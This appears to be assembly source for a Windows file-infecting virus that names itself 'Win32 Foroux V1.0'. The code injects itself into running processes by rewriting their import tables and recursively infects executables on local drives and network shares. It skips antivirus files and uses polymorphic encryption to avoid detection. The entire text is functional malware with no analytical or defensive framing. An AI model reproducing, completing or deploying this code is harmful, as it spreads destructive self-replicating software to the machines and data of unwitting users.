inject_code_size equ $-inject_code

;in--edi=process handle,ebx->process base address,ebp->inf_proc_ip
;out--ZF set,failed ZF cleared,success
CALLHEADER virtual_protect
virtual_protect:
        pushad
        push ecx
        push esp
        push large PAGE_EXECUTE_READWRITE
        push large INFPROC_PROT_SIZE
        push ebx
        push edi
        call [ebp+addrVirtualProtectEx-inf_proc_ip]
        pop ecx
        or eax,eax
        popad
        retn
virtual_protect_end:

;in--edi=process handle,ebx=process address to read,ebp->inf_proc_ip
;out--read data to vbuffer,eax->vbuffer
CALLHEADER read_proc_mem
read_proc_mem:
        lea eax,[ebp+vbuffer-inf_proc_ip]
        pushad

        push ecx
        push esp
        push large INFPROC_MAP_SIZE
        push eax
        push ebx
        push edi
        call [ebp+addrReadProcessMemory-inf_proc_ip]
        pop ecx
        or eax,eax

        popad
        retn
read_proc_mem_end:

;in--edi=process handle,ebx=process address to write,ebp->inf_proc_ip,eax->buffer,ecx=size to write
;out--write data from vbuffer
CALLHEADER write_proc_mem
write_proc_mem:
        pushad

        push ecx
        push esp
        push ecx
        push eax
        push ebx
        push edi
        call [ebp+addrWriteProcessMemory-inf_proc_ip]
        pop ecx
        or eax,eax

        popad
        retn
write_proc_mem_end:

;in--edi=process handle,ebx->process base address
CALLHEADER inf_proc
inf_proc:
        pushad
        call inf_proc_ip
inf_proc_ip:
        pop ebp

        push ebp
        lea esi,[ebp+inf_proc_seh-inf_proc_ip]
        push esi
        xor esi,esi
        push dword ptr fs:[esi]
        mov fs:[esi],esp

        lea esi,[ebp+inject_code-inf_proc_ip]
        push esi
        call blk_decrypt

        pushad

        mov ecx,[ebp+addrMapViewOfFile-inf_proc_ip]
        mov [ebp+inject_code_mapviewoffile-inf_proc_ip],ecx
        mov ecx,[ebp+addrOpenFileMappingA-inf_proc_ip]
        mov [ebp+inject_code_openfilemapping-inf_proc_ip],ecx

        call inf_proc_0
        db FMAP_NAME
inf_proc_0:
        pop edi
        push edi
        push large 0
        push large FILE_MAP_WRITE
        call ecx
        or eax,eax
        jz short inf_proc_not_mapped
        push eax
        call [ebp+addrCloseHandle-inf_proc_ip]
        jmp short inf_proc_mapped

inf_proc_not_mapped:
        mov eax,vir_mem_size
        mov ecx,eax
        SUBCALL create_mem_map,inf_proc_ip
        jz short inf_proc_mapped
        cld
        mov edi,eax
        xor eax,eax
        stosd
        mov eax,vir_size
        stosd
        lea esi,[ebp+_start-inf_proc_ip]
        rep movsb

        mov [ebp+quick_sleep-inf_proc_ip],esi ;Have quick sleep

inf_proc_mapped:
        popad

        mov [ebp+inf_proc_esp-inf_proc_ip],esp
        SUBCALL virtual_protect,inf_proc_ip
        jz inf_proc_ret
        
;edi ;Process handle
;ebx Process base address
;eax vbuffer address

        push edi
        push ebx

        SUBCALL read_proc_mem,inf_proc_ip

        cmp byte ptr [eax+MEM_INF_POS],MEM_INF_SIGN ;Has been infected?
inf_proc_seh_restore_jmp:
        jz inf_proc_seh_restore
        mov byte ptr [eax+MEM_INF_POS],MEM_INF_SIGN

        mov ecx,INFPROC_MAP_SIZE
        SUBCALL write_proc_mem,inf_proc_ip ;Write import table

        mov ebx,eax
        SUBCALL check_pe,inf_proc_ip
        jz short inf_proc_seh_restore_jmp
;eax->PE base
        mov edi,[eax+28h]
        SUBCALL get_section_of_rva,inf_proc_ip
        or ecx,ecx
        jz short inf_proc_seh_restore_jmp

        mov edi,[edx+4]
        mov [ebp+inf_proc_rva-inf_proc_ip],edi
        mov edi,[edx]
        mov ecx,[edx+8]
        cmp edi,ecx
        jna short inf_proc_3
        xchg ecx,edi
inf_proc_3:
;Now edi is the small size,ecx is the big one
        mov [ebp+inf_proc_code_size-inf_proc_ip],edi
        sub ecx,edx
        cmp ecx,inject_code_size
        jc inf_proc_seh_restore

        mov ecx,[eax+80h] ;Import directory
        or ecx,ecx
        jz short inf_proc_seh_restore_jmp
        pop ebx
        pop edi
        push ebx
        add ebx,ecx

        push ecx
        SUBCALL read_proc_mem,inf_proc_ip

        push edx
        SUBCALL get_rand,inf_proc_ip
        movzx ecx,dl
        and cl,3fh
        pop edx
        pop esi

        mov ebx,eax
        sub ebx,5*4
        push ecx
inf_proc_101:
        add ebx,5*4
        mov ecx,[ebx+3*4]
        jecxz inf_proc_102
        push eax
        sub ecx,esi
        cmp ecx,INFPROC_MAP_SIZE
        jnc short inf_proc_102
        mov eax,[eax+ecx]
        call eax_to_lowcase
        cmp eax,'resu' ;user
        pop eax
        jnz short inf_proc_101
        mov dword ptr [esp],1000h
        mov eax,ebx
inf_proc_102:
        pop ecx

        mov ebx,[eax+4*4]
        add ebx,[esp]
        push ebx
        SUBCALL virtual_protect,inf_proc_ip
        jz inf_proc_seh_restore
        SUBCALL read_proc_mem,inf_proc_ip ;read import table
        mov esi,eax

        cld
inf_proc_1:
        lodsd
        cmp eax,[ebp+addrDispatchMessageA-inf_proc_ip] ;First find DispatchMessageA/W
        jz short inf_proc_1_5
        cmp eax,[ebp+addrDispatchMessageW-inf_proc_ip] ;First find DispatchMessageA/W
        jz short inf_proc_1_5
        or eax,eax
        loopnz inf_proc_1
inf_proc_1_5:

        sub esi,4
        or eax,eax
        jnz short inf_proc_2
        sub esi,4
inf_proc_2:
        mov eax,[esi]
        mov [ebp+inject_code_raw_api-inf_proc_ip],eax

        mov ebx,[esp+4]
        add ebx,12345678h
inf_proc_rva equ $-4
        add ebx,12345678h
inf_proc_code_size equ $-4
        mov [esi],ebx
        SUBCALL virtual_protect,inf_proc_ip
        jz short inf_proc_seh_restore
        lea eax,[ebp+inject_code-inf_proc_ip]
        push large inject_code_size
        pop ecx
        SUBCALL write_proc_mem,inf_proc_ip ;Write inject code
        jz short inf_proc_seh_restore

        pop ebx
        lea eax,[ebp+vbuffer-inf_proc_ip]
        mov ecx,INFPROC_MAP_SIZE
        SUBCALL write_proc_mem,inf_proc_ip ;Write import table

inf_proc_ret:
inf_proc_seh_restore:
        mov esp,12345678h
inf_proc_esp equ $-4

        SUBCALL get_rand,inf_proc_ip
        pop esi
        mov [esi-4],dx
        call blk_encrypt

        POP    DWord Ptr FS:[0]  ; restore except chain
        pop esi
        pop esi

        popad
        retn

inf_proc_seh:
        call inf_proc_seh_ip
inf_proc_seh_ip:
        pop eax
        lea eax,[eax-(inf_proc_seh_ip-inf_proc_seh_restore)]
        PUSH  eax
        MOV   EAX,[ESP + 00Ch+4]          ; context
        POP   DWord Ptr [EAX + 0B8h]     ; context.eip = @ExceptProc
        XOR   EAX,EAX                    ; 0 = ExceptionContinueExecution
        RET

inf_proc_end:


CALLHEADER enum_proc
enum_proc:
        pushad

        call enum_proc_ip
enum_proc_ip:
        pop ebp
        mov ecx,[ebp+addrCreateToolhelp32Snapshot-enum_proc_ip]
        jecxz short enum_proc_0
        SUBCALL snap_proc,enum_proc_ip
        jmp short enum_proc_ret

enum_proc_0:
        xor eax,eax
        mov ecx,20000
enum_proc_1:
        add eax,4
        SUBCALL into_proc,snap_proc_ip
        loop enum_proc_1

enum_proc_ret:
        popad
        retn
enum_proc_end:


;in--ebp->enum_proc_ip
CALLHEADER snap_proc
snap_proc:
snap_proc_ip equ enum_proc_ip
        pushad
        push large 0
        push large 2 ;TH32CS_SNAPPROCESS
        call [ebp+addrCreateToolhelp32Snapshot-snap_proc_ip]
        or eax,eax
        jz snap_proc_ret
        push eax
        
        lea edi,[ebp+snapbuf-snap_proc_ip]
        mov dword ptr [edi],296 ;size
        push edi
        push eax
        call [ebp+addrProcess32First-snap_proc_ip]

snap_proc_1:
        or eax,eax
        jz snap_proc_2
        mov ecx,[ebp+is9x-snap_proc_ip]
        jecxz snap_proc_3
        push edi
        lea ebx,[edi+9*4] ;->szExeFile
        call snap_proc_4
        db '\explorer',0
snap_proc_4:
        pop edi

        SUBCALL str_instr,snap_proc_ip
        pop edi
        jnz short snap_proc_5 ;If is Win9X,only explorer to infect
snap_proc_3:
        mov eax,[edi+2*4] ;th32ProcessID
        SUBCALL into_proc,snap_proc_ip
snap_proc_5:
        pop eax
        push eax

        push edi
        push eax
        call [ebp+addrProcess32Next-snap_proc_ip]
        jmp snap_proc_1

snap_proc_2:    
        call [ebp+addrCloseHandle-snap_proc_ip]
snap_proc_ret:
        popad
        retn
snap_proc_end:


;in--ebp->enum_proc_ip,eax=PID
CALLHEADER into_proc
into_proc:
into_proc_ip equ enum_proc_ip
        pushad

        push eax
        push large 0
        push large 0fffh
        call [ebp+addrOpenProcess-into_proc_ip]
        or eax,eax
        jz short into_proc_2
        push eax
        xchg eax,edi
        mov ebx,400000h
        SUBCALL inf_proc,into_proc_ip
        call [ebp+addrCloseHandle-enum_proc_ip]
into_proc_2:
        popad
        retn
into_proc_end:


;in--ebx->image base
;out--ZF not set,is valid PE,ZF set,invalid,eax->PE base
CALLHEADER check_pe
check_pe:
        push ecx
        xor ecx,ecx
        cmp word ptr [ebx],'ZM'
        jnz short check_pe_ret
        mov eax,[ebx+3ch]
        add eax,ebx
        cmp word ptr [eax],'EP'
        jnz short check_pe_ret
        test byte ptr [eax+16h+1],20h ;Is a DLL?
        jnz short check_pe_ret
        push ebx
        mov bl,[eax+5ch] ;Subsystem
        and bl,0feh
        cmp bl,2
        pop ebx
        jnz short check_pe_ret
        inc ecx
check_pe_ret:
        or ecx,ecx
        pop ecx
        retn
check_pe_end:


;Get the section of a RVA
;in--eax=PE base,edi=RVA to find
;out--edx->section header.VirtualSize,ecx=0 means not found
;if not found,edx=>last section header.VirtualSize
CALLHEADER get_section_of_rva
get_section_of_rva:
        push ecx
        movzx edx,word ptr [eax+14h]
        lea edx,[eax+edx+18h+8-28h] ;->before first section header.VirtualSize
        movzx ecx,word ptr [eax+6]
        inc ecx
get_section_of_rva_1:
        dec ecx
        jecxz get_section_of_rva_2
        add edx,28h ;->VirtualSize
        mov esi,[edx+4]; esi=VirtualAddress
        cmp edi,esi ;RVA<VirtualAddress?
        jc short get_section_of_rva_1
        add esi,[edx]; esi=VirtualAddress+VirtualSize
        cmp esi,edi;VirtualAddress+VirtualSize<RVA
        jna short get_section_of_rva_1
get_section_of_rva_2:
        or ecx,ecx
        pop ecx
        retn
get_section_of_rva_end:


;Copy and encrypt vir body to infbuffer
CALLHEADER prepare_buffer
prepare_buffer:
        pushad
        call pre_buf_ip
pre_buf_ip:
        pop ebp

        SUBCALL poly_start,pre_buf_ip
        SUBCALL poly_callsub,pre_buf_ip
        SUBCALL poly_blk_encrypt,pre_buf_ip
        SUBCALL poly_blk_encrypt_poly,pre_buf_ip

        lea esi,[ebp+_start-pre_buf_ip]
        lea edi,[ebp+infbuffer-pre_buf_ip]
        mov ecx,vir_size
        cld
        push edi
        rep movsb
        
        SUBCALL get_rand,pre_buf_ip
        pop edi
        lea esi,[edi+prepare_buffer-_start]
        mov word ptr [esi-4],dx
        call blk_encrypt
        
        xchg dh,dl
        lea esi,[edi+main_thread-_start]
        mov word ptr [esi-4],dx
        call blk_encrypt

        popad
        retn
prepare_buffer_end:


CALLHEADER poly_callsub
poly_callsub:
        pushad
        call poly_callsub_ip
poly_callsub_ip:
        pop ebp
        SUBCALL get_rand,poly_callsub_ip
        lea edi,[ebp+_callsub-poly_callsub_ip]
        mov dword ptr [edi],000000e8h+(blk_encrypt-call_sub_1)*100h
        mov dword ptr [edi+4],0fc76ff00h
        test dl,1
        jz short poly_callsub_1
        mov dword ptr [edi],0e8fc76ffh
        mov dword ptr [edi+4],00000000h+(blk_encrypt-call_sub_1-3)
poly_callsub_1:

        mov dword ptr [edi+8],0fc46c766h
        mov dword ptr [edi+8+4],0ff560000h
        test dl,2
        jz short poly_callsub_2
        mov dword ptr [edi+8],046c76656h
        mov dword ptr [edi+8+4],0ff0000fch
poly_callsub_2:

        popad
        retn
poly_callsub_end:

;in--edx=random
CALLHEADER poly_blk_encrypt
poly_blk_encrypt:
        pushad
        call poly_blk_encrypt_ip
poly_blk_encrypt_ip:
        pop edi
        add edi,blk_encrypt-poly_blk_encrypt_ip
        test dl,1
        jz short poly_blk_encrypt_1
poly_blk_encrypt_@1 equ $
        mov bl,[edi]
        xchg bl,[edi+1]
        xchg bl,[edi]
poly_blk_encrypt_1:

poly_blk_encrypt_@2 equ $+1
        mov bx,5f56h
        mov word ptr [edi+2],bx
        test dl,2
        jz short poly_blk_encrypt_2
poly_blk_encrypt_@3 equ $+1
        mov bx,0fe8bh
        mov word ptr [edi+2],bx
poly_blk_encrypt_2:

        mov dword ptr [edi+blk_encrypt_@1],0f59006ah
        test dl,4
        jz short poly_blk_encrypt_3
        mov dword ptr [edi+blk_encrypt_@1],0f90c933h
poly_blk_encrypt_3:

poly_blk_encrypt_4:
        popad
        retn
poly_blk_encrypt_end:


;in--edi->offset poly_blk_encrypt
CALLHEADER poly_blk_encrypt_poly
poly_blk_encrypt_poly:
        pushad

        call poly_blk_encrypt_poly_ip
poly_blk_encrypt_poly_ip:
        pop ebp
        lea edi,[ebp+poly_blk_encrypt-poly_blk_encrypt_poly_ip]
        mov esi,edi
        call blk_decrypt
        SUBCALL get_rand,poly_blk_encrypt_poly_ip
        and dl,3h ;only take four common reg,eax,ebx,ecx,edx
        mov al,dl
        shl al,3
        and byte ptr [edi+poly_blk_encrypt_@1+1-poly_blk_encrypt],0c7h
        or [edi+poly_blk_encrypt_@1+1-poly_blk_encrypt],al
        and byte ptr [edi+poly_blk_encrypt_@1+3-poly_blk_encrypt],0c7h
        or [edi+poly_blk_encrypt_@1+3-poly_blk_encrypt],al
        and byte ptr [edi+poly_blk_encrypt_@1+6-poly_blk_encrypt],0c7h
        or [edi+poly_blk_encrypt_@1+6-poly_blk_encrypt],al

        mov al,dh
        and al,3
        and byte ptr [edi+poly_blk_encrypt_@2-poly_blk_encrypt],0f8h
        or [edi+poly_blk_encrypt_@2-poly_blk_encrypt],al
        shl al,3
        and byte ptr [edi+poly_blk_encrypt_@2+5-poly_blk_encrypt],0c7h
        or [edi+poly_blk_encrypt_@2+5-poly_blk_encrypt],al

        SUBCALL get_rand,poly_blk_encrypt_poly_ip

        mov al,dh
        and al,3
        and byte ptr [edi+poly_blk_encrypt_@3-poly_blk_encrypt],0f8h
        or [edi+poly_blk_encrypt_@3-poly_blk_encrypt],al
        shl al,3
        and byte ptr [edi+poly_blk_encrypt_@3+5-poly_blk_encrypt],0c7h
        or [edi+poly_blk_encrypt_@3+5-poly_blk_encrypt],al

        mov esi,edi
        call blk_encrypt
        popad
        retn
poly_blk_encrypt_poly_end:

CALLHEADER poly_start
poly_start:
        pushad
        call poly_start_ip
poly_start_ip:
        pop ebp

        SUBCALL get_rand,poly_start_ip
        test dl,1
        jz short poly_start_1
        mov eax,[ebp+_start_@1-poly_start_ip]
        xchg eax,[ebp+_start_@2-poly_start_ip]
        xchg eax,[ebp+_start_@1-poly_start_ip]
poly_start_1:

        lea esi,[ebp+_start_@3+1-poly_start_ip]
        and dl,3
        and byte ptr [esi+2],0f8h
        or [esi+2],dl
        shl dl,3
        and byte ptr [esi],0c7h
        or [esi],dl

        and dh,018h
        add esi,main_enter-_start_@3 ;esi->main_enter+1
        and byte ptr [esi],0c7h
        or [esi],dh
        add esi,3
        and byte ptr [esi],0c7h
        or [esi],dh
        rol edx,8
        dec esi ;esi->main_enter
        mov byte ptr [esi],89h
        test dl,1
        jz short poly_start_2
        mov byte ptr [esi],87h
poly_start_2:
        popad
        retn
poly_start_end:
;*******************************infproc.asm end*****************************

;*******************************mainthrd.asm*****************************
;include mainthrd.asm
CALLHEADER main_thread
main_thread:

        call main_thread_ip
main_thread_ip:
        pop ebp

if DEBUG
OUTSTRING 'I go in'
endif

        SUBCALL get_extra_proc,main_thread_ip
        SUBCALL prepare_buffer,main_thread_ip

        call [ebp+addrGetVersion-main_thread_ip]
        shr eax,31 ;MSB=1 means is Win9X
        mov [ebp+is9x-main_thread_ip],eax

        sub esp,MAX_DIR_SIZE
        cld

        xor eax,eax
        mov [ebp+goto_enum_proc_pretime-main_thread_ip],eax
        mov [ebp+quick_sleep-main_thread_ip],eax

        call [ebp+addrGetTickCount-main_thread_ip]
        mov [ebp+have_a_sleep_pretime-main_thread_ip],eax

        call goto_enum_proc

;Infect module path
        mov edi,esp
        push large MAX_DIR_SIZE
        push edi
        push large 0
        call [ebp+addrGetModuleFileNameA-main_thread_ip]
        call find_str_tail
        std
        mov cl,0ffh
        mov al,'\'
        repnz scasb
        cld
        mov byte ptr [edi+1],0
        call enum_path

;Infect all driver
infect_all_driver:
        SUBCALL get_rand,main_thread_ip
        and dl,3
        add dl,'c' ;first try C:~F:
        mov [esp],dl
        mov word ptr [esp+1],':'
        
        push large ((INFECT_LASTDISK-INFECT_FIRSTDISK) and 0ffh)+1
        pop ecx

infect_disk_loop:
        mov edi,ecx
        push esp
        call [ebp+addrGetDriveTypeA-main_thread_ip]
        cmp al,3
        jc short next_disk
        cmp al,4
        ja short next_disk
        call enum_path
next_disk:
        mov al,[esp]
        inc al
        cmp al,INFECT_LASTDISK and 0ffh
        jbe short next_disk_1
        mov al,INFECT_FIRSTDISK and 0ffh
next_disk_1:
        mov [esp],al
        mov ecx,edi
        loop infect_disk_loop

;Infect through net
infect_net:
        xor eax,eax
        call enum_net

;Sleep 20 minutes
        push large 60
        pop edi
main_thread_wait:
        call goto_enum_proc
        push large 20*1000
        call [ebp+addrSleep-main_thread_ip]
        dec edi
        jnz short main_thread_wait

        jmp short infect_all_driver

db 'Win32 Foroux V1.0'


;stack map
;esp->find file handle
;esp+4->WIN32_FIND_DATA
;esp+4+8*4+size WIN32_FIND_DATA->return address
;esp+4+8*4+size WIN32_FIND_DATA+4->find path
enum_path:
enum_path_ip equ main_thread_ip
        pushad
        lea esi,[esp+4+4*8]
        call copy_path

        call find_str_tail

if DEBUG
        mov eax,'*.1\'
else
        mov eax,'*.*\'
endif

        stosd
        xor eax,eax
        stosd

        sub esp,size WIN32_FIND_DATA
        lea esi,[ebp+pathname_buf-enum_path_ip]
        push esp
        push esi
        call [ebp+addrFindFirstFileA-enum_path_ip]
        inc eax
        jz enum_path_ok
        dec eax
        push eax ;handle of find file

found_one_file:
        test dword ptr [esp+4+0],FILE_ATTRIBUTE_OFFLINE or FILE_ATTRIBUTE_REPARSE_POINT or FILE_ATTRIBUTE_SPARSE_FILE or FILE_ATTRIBUTE_TEMPORARY ;dwFileAttributes
        jnz enum_next_file_jmp1

        lea esi,[esp+4+size WIN32_FIND_DATA+4+4*8]
        call copy_path
        push edi
        call find_str_tail
        mov ecx,MAX_PATH
        mov al,'\'
        stosb
        lea esi,[esp+4+4+2ch] ;cFileName
        mov eax,[esi]
        rep movsb
        pop esi

;Check whether the file name is '.' or '..'
        not eax
        test eax,00002e2eh ;is '..'?
        jz short enum_next_file_jmpz
        test ax,002eh ;is '.'?
        jz short enum_next_file_jmp1

        test dword ptr [esp+4+0],FILE_ATTRIBUTE_DIRECTORY
        jz short enum_do_fop

;Avoid go into Temporary Internet Files directory,
;because there are too many html files which can't be infected,we must save time
        call enum_path_1
        db 'rary Inter',0
enum_path_1:
        pop edi
        mov ebx,esi
        push esi ;ESI must be protected because SUBCALL will destroy it.
        SUBCALL str_instr,enum_path_ip
        pop esi
        jz short enum_next_file_jmpz
;Don't infect files in dllcache
        push esi
        SUBCALL is_in_dllcache,enum_path_ip
        pop esi
enum_next_file_jmpz:
        jz short enum_next_file

        mov ecx,MAX_DIR_SIZE
        sub esp,ecx
        mov edi,esp
        rep movsb
        call enum_path ;recursion infect path
        add esp,MAX_DIR_SIZE ;clear stack frame
enum_next_file_jmp1:
        jmp short enum_next_file

enum_do_fop:

;Check AV file
        not eax
        call eax_to_lowcase
        lea edi,[ebp+av_name-enum_path_ip]
        push large av_name_num
        pop ecx
        repnz scasd
        jz short enum_next_file_jmp1
        and eax,00ffffffh
        cmp eax,'0pva' and 00ffffffh ;avp
        jz short enum_next_file_jmp1
        cmp eax,'0van' and 00ffffffh ;nav
        jz short enum_next_file_jmp1

        mov edi,esi
;For quick and quiet infection,I'd better check the file extension
;But for infect widely,I have 1/4 chance to infect any file without check its extension.
        call find_str_tail
        mov eax,[edi-4]
        call eax_to_lowcase
        cmp eax,'exe.'
        jz short enum_do_fop_1
        cmp eax,'rcs.'
        jz short enum_do_fop_1
        test byte ptr [ebp+callsub_seed-enum_path_ip],3
enum_next_file_jmpnz:
        jnz short enum_next_file

enum_do_fop_1:
        mov edi,esi
        SUBCALL file_operate,enum_path_ip

enum_next_file:
        call have_a_sleep

        lea eax,[esp+4] ;WIN32_FIND_DATA
        mov ecx,[esp] ;find file handle
        push eax
        push ecx
        call [ebp+addrFindNextFileA-enum_path_ip]
        or eax,eax
        jnz found_one_file

infect_one_path_close:
;Now esp->find file handle
        call [ebp+addrFindClose-enum_path_ip]

enum_path_ok:
        add esp,size WIN32_FIND_DATA ;clear stack frame
        popad
        retn
enum_path_end:

av_name equ this dword
        dd 'pva_' ;_avp
        dd 'rela' ;aler
        dd 'noma' ;amon
        dd 'itna' ;anti
        dd '3don' ;nod3
        dd 'sspn' ;npss
        dd 'sern' ;nres
        dd 'hcsn' ;nsch
        dd 's23n' ;n32s
        dd 'iwva' ;avwi
        dd 'nacs' ;scan
        dd 'ts-f' ;f-st
        dd 'rp-f' ;f-pr
av_name_num equ ($-av_name)/4

enum_net:
enum_net_ip equ main_thread_ip
        pushad
        mov ebx,4*3+MAX_NETRESOURCE_NUM*8*4-4
        mov ecx,1000h
probpage_loop:
        sub ebx,ecx
        jb short probpage_end
        sub esp,ecx
        push ecx
        pop ecx
        jmp short probpage_loop
probpage_end:
        add ebx,ecx
        sub esp,ebx

;Stack map
;esp->enumeration handle
;esp+4->number of entries=-1
;esp+8->buffer size=MAX_NETRESOURCE_NUM*8*4
;esp+0ch->buffer

        push large 0
        mov ecx,[ebp+addrWNetOpenEnumA-enum_net_ip]
        jecxz enum_net_ret_jmp
        push esp
        push eax
        push large RESOURCEUSAGE_ALL
        push large RESOURCETYPE_DISK
        push large RESOURCE_GLOBALNET
        call ecx
        or eax,eax
        jnz short enum_net_ret_jmpnz

        mov ecx,[ebp+addrWNetEnumResourceA-enum_net_ip]
enum_net_ret_jmp:
        jecxz enum_net_ret_jmp2
        mov esi,[esp] ;esi=enumeration handle
        lea edi,[esp+8] ;edi->buffer size
        mov dword ptr [edi],MAX_NETRESOURCE_NUM*8*4
        push edi
        lea edi,[esp+0ch+4] ;edi->buffer
        push edi
        lea edi,[esp+4+4*2] ;edi->number of entries
        dec eax
        mov dword ptr [edi],eax
        push edi
        push esi
        call ecx
        or eax,eax
enum_net_ret_jmpnz:
        jnz short enum_net_ret
        mov ecx,[edi]
enum_net_ret_jmp2:
        jecxz enum_net_ret
enum_net_loop:
        lea edx,[ecx*4]
        test dword ptr [esp+edx*8+0ch-8*4+4*3],RESOURCEUSAGE_CONTAINER ;dwUsage is RESOURCEUSAGE_CONTAINER?
        jz short not_container ;no

        lea eax,[esp+edx*8-8*4+0ch]
        call enum_net ;recurse infect the container
        jmp short enum_net_loop_next

not_container:
        mov esi,[esp+edx*8+0ch-8*4+4*5] ;esi=lpRemoteName
        or esi,esi
        jz short enum_net_loop_next

        mov edi,esi
        call find_str_tail
        mov eax,[edi-2]
        call eax_to_lowcase
        and eax,00ffffffh
        cmp eax,'00a\' and 0000ffffh ;is '\a'?If so,maybe floppy,don't infect it
        jz short enum_net_loop_next
        cmp eax,'00b\' and 0000ffffh ;is '\b'?If so,maybe floppy,don't infect it
        jz short enum_net_loop_next

        sub esp,MAX_DIR_SIZE
        mov edi,esp

;OUTSTRING3 esi,enum_net_ip
enum_net_1:
        lodsb
        stosb
        or al,al
        jnz short enum_net_1 ;copy remote name
        call enum_path
        add esp,MAX_DIR_SIZE

enum_net_loop_next:
        loop enum_net_loop

enum_net_ret:
;esp->enumeration handle
        pop eax
        mov ecx,[ebp+addrWNetCloseEnum-enum_net_ip]
        jecxz enum_net_ret_1
        or eax,eax
        jz enum_net_ret_1
        push eax
        call ecx
enum_net_ret_1:
        add esp,4*3+MAX_NETRESOURCE_NUM*8*4-4
        popad
        ret
enum_net_end:


goto_enum_proc:
        pushad
        pushfd
        call goto_enum_proc_ip
goto_enum_proc_ip:
        pop ebp
;Can't infect process too frequently,if so,some program will corrupt when they start.
        call [ebp+addrGetTickCount-goto_enum_proc_ip]
        mov ebx,12345678h
goto_enum_proc_pretime equ $-4
        mov ecx,eax
        sub ecx,ebx
        cmp ecx,1000*60 ;Only more than every one minute to infect process
        jc short goto_enum_proc_1
        mov [ebp+goto_enum_proc_pretime-goto_enum_proc_ip],eax


        SUBCALL enum_proc,goto_enum_proc_ip

goto_enum_proc_1:
        popfd
        popad
        retn


have_a_sleep:
        pushad
        call have_a_sleep_ip
have_a_sleep_ip:
        pop ebp

        mov edi,[ebp+addrGetTickCount-have_a_sleep_ip]

        call edi
        mov ebx,12345678h
have_a_sleep_pretime equ $-4
        sub eax,ebx

        mov ebx,500 ;If isn't quick sleep,continue run for 500 millisecond
        push large 50 ;Sleep for 50 seconds
        pop esi

        mov ecx,[ebp+quick_sleep-have_a_sleep_ip]
        jecxz have_a_sleep_1 ;Not quick sleep

        mov ebx,3000 ;If is quick sleep,continue run for 3000 millisecond
        push large 20 ;Sleep for 20 seconds
        pop esi

have_a_sleep_1:
        cmp eax,ebx
        jc short have_a_sleep_ret

        shl esi,10
        push esi
        call [ebp+addrSleep-have_a_sleep_ip]

        call edi
        mov [ebp+have_a_sleep_pretime-have_a_sleep_ip],eax

        call test_quick_sleep

        call goto_enum_proc

have_a_sleep_ret:
        popad
        retn
have_a_sleep_end:


;in--ebp->have_a_sleep_ip
test_quick_sleep:
test_qs_ip equ have_a_sleep_ip
        call test_qs_1
        db MUTEX_NAME
test_qs_1:
        pop edi
        push edi
        push large 0
        push large FILE_MAP_WRITE
        call [ebp+addrOpenFileMappingA-test_qs_ip]
        or eax,eax
        jz short test_qs_2
        push eax
        call [ebp+addrCloseHandle-test_qs_ip]
        retn
test_qs_2:
        inc eax
        SUBCALL create_mem_map,test_qs_ip
        jz short test_qs_3
        mov [ebp+quick_sleep-test_qs_ip],eax
        push eax
        call [ebp+addrUnmapViewOfFile-test_qs_ip]
test_qs_3:
        retn
test_quick_sleep_end:


copy_path:
;in--esi->path,ebp->enum_path_ip
;on return,edi->pathname_buf
        mov ecx,MAX_DIR_SIZE
        lea edi,[ebp+pathname_buf-enum_path_ip]
        push edi
        rep movsb
        pop edi
        ret

find_str_tail:
;edi->string,on return,edi->0
        push eax
        push ecx
        xor eax,eax
        mov ch,0ffh
        repnz scasb
        dec edi
        pop ecx
        pop eax
        ret

eax_to_lowcase:
        push ecx
        push large 4
        pop ecx
eax_to_lowcase_0:
        cmp al,'A'
        jc eax_to_lowcase_1
        cmp al,'Z'
        ja eax_to_lowcase_1
        add al,'a'-'A'
eax_to_lowcase_1:
        ror eax,8
        loop eax_to_lowcase_0
        pop ecx
        retn

main_thread_end:



;in--ebx->string,edi->sub string to find
;out--ZF set means is in string,ZF cleared means not in
CALLHEADER str_instr
str_instr:
        pushad
        call str_instr_ip
str_instr_ip:
        pop ebp
        cld
        mov al,38h
        mov ebp,[ebp+addrlstrcmpiA-str_instr_ip]
        or ebp,ebp
        jz short str_instr_ret
        dec ebx
str_instr_1:
        inc ebx
        call str_len
        mov esi,ecx ;ebx=sub string len
        xchg ebx,edi
        call str_len ;ecx=source string len
        xchg ebx,edi
        push large 38h
        pop eax
        cmp esi,ecx
        ja short str_instr_ret
        mov dl,[ebx+esi]
        push edx
        push ebx
        mov byte ptr [ebx+esi],0
        push ebx
        push edi
        call ebp
        or eax,eax
        pop ebx
        pop edx
        mov [ebx+esi],dl
        jnz short str_instr_1
str_instr_ret:
        or eax,eax
        popad
        retn

;in--edi->string
;out--ecx=string length
str_len:
        push edi
        xor al,al
        xor ecx,ecx
        dec ecx
        repnz scasb
        pop edi
        not ecx
        dec ecx
        retn
str_len_end:

str_instr_end:


;in--ebx->full path
;out--ZF set is in,ZF cleared,not in
CALLHEADER is_in_dllcache
is_in_dllcache:
        pushad
        call is_in_dllcache_ip
is_in_dllcache_ip:
        pop ebp
        call is_in_dllcache_1
        db 'tem32\dllcac',0
is_in_dllcache_1:
        pop edi
        SUBCALL str_instr,is_in_dllcache_ip
        popad
        retn
is_in_dllcache_end:

;Out--edx=random
CALLHEADER get_rand
get_rand:
        pushad
        call get_rand_ip
get_rand_ip:
        pop ebp
        call [ebp+addrGetTickCount-get_rand_ip]
        mov ecx,12345678h
rand_seed equ $-4
        add eax,ecx
        rol ecx,1
        add ecx,esp
        add [ebp+rand_seed-get_rand_ip],ecx
        push large 32
        pop ecx
get_rand_1:
        shr eax,1
        jnc get_rand_2
        xor eax,HASH16FACTOR
get_rand_2:
        loop get_rand_1
        mov [esp+5*4],eax
        mov [ebp+callsub_seed-get_rand_ip],ax

        popad
        retn
get_rand_end:


CALLHEADER get_extra_proc
get_extra_proc:
        pushad

        call get_extra_proc_ip
get_extra_proc_ip:
        pop ebp
        lea edi,[ebp+sfc_hash_table-8-get_extra_proc_ip]
        push large 1
get_extra_proc_0:
        push edi
        call [ebp+addrLoadLibraryA-get_extra_proc_ip]
        or eax,eax
        jz short get_extra_proc_1
        mov ebx,eax
        sub ebx,10000h
        SUBCALL search_api_addr,get_extra_proc_ip
get_extra_proc_1:
        pop ecx
        jecxz get_extra_proc_2
        dec ecx
        push ecx
        lea edi,[ebp+mpr_hash_table-8-get_extra_proc_ip]
        jmp short get_extra_proc_0
get_extra_proc_2:

        call get_extra_proc_3
        db 'user32',0
get_extra_proc_3:
        call [ebp+addrLoadLibraryA-get_extra_proc_ip]
        or eax,eax
        jz short get_extra_proc_4
        mov ebx,eax
        sub ebx,10000h
        lea edi,[ebp+user32_hash_table-8-get_extra_proc_ip]
